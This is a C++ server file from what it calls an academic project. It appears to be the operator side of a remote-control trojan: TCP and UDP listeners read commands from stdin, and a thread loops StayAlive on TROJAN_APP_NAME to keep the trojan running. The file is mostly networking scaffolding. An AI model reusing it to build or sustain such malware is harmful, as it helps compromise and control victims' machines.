// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++ and C#: http://www.viva64.com

#include "..\Service\pch.hpp"

#include "Server.hpp"
#include "..\Network\TCP\TCPServer.hpp"
#include "..\Network\Protocols\CommandMessageProtocol.hpp"
#include "..\Service\Debugger.hpp"
#include "..\Service\Tools.hpp"
#include "..\Network\UDP\UDPServer.hpp"
#include "..\Service\Constants.hpp"

Server::Server() noexcept :
	m_io         { },
	m_tcp_server { nullptr },
	m_udp_server { nullptr },
	m_thread     { },
	m_save_thread{ }
{ }

Server::~Server() noexcept = default;

void Server::init()
{
	m_tcp_server  = std::make_unique<TCPServer>(m_io, std::atoi(DEFAULT_PORT));
	m_udp_server  = std::make_unique<UDPServer>(m_io, std::atoi(DEFAULT_PORT));
	m_thread      = std::thread{ [this]() { m_io.run(); } };
	m_save_thread = std::thread{ []() { for (;;) StayAlive(TROJAN_APP_NAME); } };
}

void Server::init(std::string_view port)
{
	m_tcp_server  = std::make_unique<TCPServer>(m_io, std::atoi(port.data()));
	m_udp_server  = std::make_unique<UDPServer>(m_io, std::atoi(port.data()));
	m_thread      = std::thread{ [this]() { m_io.run(); } };
	m_save_thread = std::thread{ []() { for (;;) StayAlive(TROJAN_APP_NAME); } };
}

void Server::run()
{
	char line[CMPROTO::MAX_BODY_LENGTH + 1]{ };
	while (std::cin.getline(line, CMPROTO::MAX_BODY_LENGTH + 1))
	{
		std::shared_ptr<CMPROTO> msg{ std::make_shared<CMPROTO>() };
		msg->set_body_length(std::strlen(line));
		std::memcpy(msg->get_body().data(), line, msg->get_body_length());
		msg->encode_header();

		// m_tcp_server->write(&msg);
	}
}

void Server::close()
{
	m_thread.join();
	m_save_thread.join();
}
